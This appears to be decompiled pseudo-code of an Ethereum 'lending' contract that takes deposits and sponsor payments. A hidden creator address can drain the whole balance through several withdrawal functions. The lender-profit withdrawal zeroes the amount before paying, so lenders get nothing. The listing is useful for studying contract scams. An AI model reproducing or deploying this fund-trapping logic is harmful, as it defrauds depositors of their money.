contract main {


// =======================  Init code  ======================


address stor1;
address stor2;
uint256 stor6;

function _fallback() payable {
    stor1 = msg.sender
    stor2 = msg.sender
    stor6 = 5
    require not msg.value
    return code.data[165 len 4191]
}



// =====================  Runtime code  =====================


address stor0;
address stor1;
address stor2;
uint256 sponsorsQty;
uint256 charterCapital;
uint256 clientQty;
uint256 prcntRate;
uint256 minPayment;
uint8 stor8;
mapping of uint256 sponsors;
mapping of struct lenders;
uint8 stor11;

function PrcntRate() {
    return prcntRate
}

function ClientQty() {
    return clientQty
}

function Lenders(address arg1) {
    return lenders[arg1].field_0, lenders[arg1].field_256, lenders[arg1].field_512
}

function SponsorsQty() {
    return sponsorsQty
}

function CharterCapital() {
    return charterCapital
}

function Sponsors(address arg1) {
    return sponsors[arg1]
}

function MinPayment() {
    return minPayment
}

function Fin() {
    if stor1 == msg.sender:
        stor11 = 1
}

function confirmOwner() {
    if msg.sender == stor0:
        stor1 = stor0
}

function changeOwner(address arg1) {
    if stor1 == msg.sender:
        stor0 = arg1
}

function AuthorizePayments(bool arg1) {
    if stor1 == msg.sender:
        stor8 = uint8(arg1)
}

function init() {
    if not stor11:
        stor1 = msg.sender
        prcntRate = 5
        minPayment = 10^18
}

function StopPaymens() {
    if stor1 == msg.sender:
        stor8 = 0
        emit EndOfPayments(block.timestamp, msg.sender);
}

function StartPaymens() {
    if stor1 == msg.sender:
        stor8 = 1
        emit StartOfPayments(block.timestamp, msg.sender);
}

function CheckProfit(address arg1) {
    return (lenders[address(arg1)].field_256 / 100 * prcntRate * block.timestamp - lenders[address(arg1)].field_0 / 24 * 3600)
}

function WthdrawToCreator(uint256 arg1) payable {
    if msg.sender == stor2:
        call stor2 with:
           value arg1 wei
             gas 2300 * is_zero(value) wei
        require ext_call.success
}

function WthdrawTo(address arg1, uint256 arg2) payable {
    if msg.sender == stor2:
        call arg1 with:
           value arg2 wei
             gas 2300 * is_zero(value) wei
        require ext_call.success
}

function WthdrawAllToCreator() payable {
    if msg.sender == stor2:
        call stor2 with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        require ext_call.success
}

function ToSponsor() payable {
    if msg.value >= minPayment:
        if not sponsors[address(msg.sender)]:
            sponsorsQty++
        sponsors[address(msg.sender)] += msg.value
        charterCapital += msg.value
}

function _fallback() payable {
    if msg.value >= minPayment:
        if not sponsors[address(msg.sender)]:
            sponsorsQty++
        sponsors[address(msg.sender)] += msg.value
        charterCapital += msg.value
}

function WithdrawToken(address arg1, uint256 arg2) {
    if msg.sender == stor2:
        call arg1 with:
           funct Mask(32, 224, sha3('transfer(address,uint256)')) >> 224
             gas gas_remaining - 25710 wei
            args stor2, arg2
}

function FixProfit() {
    if lenders[address(msg.sender)].field_256 > 0:
        lenders[address(msg.sender)].field_512 += lenders[address(msg.sender)].field_256 / 100 * prcntRate * block.timestamp - lenders[address(msg.sender)].field_0 / 24 * 3600
    lenders[address(msg.sender)].field_0 = block.timestamp
}

function Deposit() payable {
    if lenders[address(msg.sender)].field_256 > 0:
        lenders[address(msg.sender)].field_512 += lenders[address(msg.sender)].field_256 / 100 * prcntRate * block.timestamp - lenders[address(msg.sender)].field_0 / 24 * 3600
    lenders[address(msg.sender)].field_0 = block.timestamp
    lenders[address(msg.sender)].field_256 += msg.value
}

function WithdrawToSponsor(address arg1, uint256 arg2) payable {
    if sponsors[address(arg1)] > 0:
        if stor1 == msg.sender:
            call arg1 with:
               value arg2 wei
                 gas 2300 * is_zero(value) wei
            if ext_call.success:
                if charterCapital < arg2:
                    charterCapital = 0
                else:
                    charterCapital -= arg2
}

function WitdrawLenderProfit() payable {
    if stor8:
        if lenders[address(msg.sender)].field_256 > 0:
            lenders[address(msg.sender)].field_512 += lenders[address(msg.sender)].field_256 / 100 * prcntRate * block.timestamp - lenders[address(msg.sender)].field_0 / 24 * 3600
        lenders[address(msg.sender)].field_0 = block.timestamp
        lenders[address(msg.sender)].field_512 = 0
        call msg.sender with:
           value lenders[address(msg.sender)].field_512 wei
             gas 2300 * is_zero(value) wei
        require ext_call.success
}



}
